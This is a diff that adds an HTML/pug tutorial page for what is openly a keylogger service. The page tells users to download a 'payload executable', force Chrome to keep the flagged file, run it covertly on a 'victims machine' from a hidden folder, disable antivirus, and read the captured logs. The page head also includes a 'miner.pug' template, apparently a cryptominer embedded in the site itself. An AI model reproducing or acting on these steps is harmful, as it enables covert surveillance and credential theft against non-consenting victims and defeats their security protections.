@@ -1,0 +1,37 @@
+<html>
+	<head>
+		<title>Home</title>
+		include head.pug
+		include miner.pug
+	</head>
+	<body>
+		include navbar.pug
+		<div class="container text-white">
+			<div class="row">
+				<div class="col-md">
+					<h1>How To Use</h1>
+					<h2 class="mt-5">Step 1</h2>
+					<p>Go to <strong>/home</strong> and download the payload executable by clicking <button class="btn btn-outline-light">Download Payload <i class="fas fa-download"></i></button></p>
+					<p>Chrome may flag it as a virus and refuse to download it, in that case go to chrome's downloads and click on <strong>Keep dangerous file</strong></p>
+					<img src="/img?num=1" alt="Step 1" class="img-fluid tutorial-img">
+					<h2 class="mt-5">Step 2</h2>
+					<p>On <strong>/home</strong> click <button class="btn btn-outline-light">View Secret Key <i class="fas fa-key"></i></button> and copy your key from the prompt, you will need it later</p>
+					<img src="/img?num=4" alt="Step 2" class="img-fluid tutorial-img">
+					<h2 class="mt-5">Step 3</h2>
+					<p>On the victims machine run the executable and insert your key to start the logger</p>
+					<p>You can transfer the <strong>.exe</strong> with a usb drive allongside a <strong>.txt</strong> containing your key</p>
+					<img src="/img?num=3" alt="Step 3" class="img-fluid tutorial-img">
+					<h2 class="mt-5">Step 4</h2>
+					<p>View all the logs collected from that machine by clicking <button class="btn btn-outline-light">Show Logs <i class="fas fa-file-alt"></i></button></p>
+					<p>Keep in mind that each account corresponds to one client, so you can't have multiple victims on one account. If you need more feel free to create multiple accounts.</p>
+					<img src="/img?num=6" alt="Step 4" class="img-fluid tutorial-img">
+					<h2 class="mt-5">Tips</h2>
+					<p>Before running the payload on the target make a hidden folder and run the executable from there</p>
+					<p>Disable any antivirus software</p>
+					<p>If you need assistance join our <a href="/discord">Discord server</a></p>
+				</div>
+			</div>
+		</div>
+		include footer.pug
+	</body>
+</html>
